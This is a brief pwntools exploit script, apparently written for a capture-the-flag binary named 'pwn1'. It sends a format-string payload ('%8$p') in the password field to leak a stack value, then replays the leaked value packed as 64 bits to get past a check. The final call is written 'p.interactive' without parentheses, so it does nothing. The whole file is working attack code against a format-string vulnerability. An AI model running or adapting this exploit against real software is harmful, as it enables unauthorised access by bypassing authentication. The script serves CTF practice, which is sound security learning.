from pwn import *
context.log_level = 'debug'
context.terminal = ["qterminal", "-e"]

p = process("./pwn1")
p.recvuntil(b"name:")
p.sendline("root")
p.recvuntil(b"password:\n")
p.sendline("%8$p")
p.recvuntil('Your password 0x')
de = int(p.recv(16), 16)
p.recvuntil("again!")
pause()
p.sendline(p64(de))
p.interactive
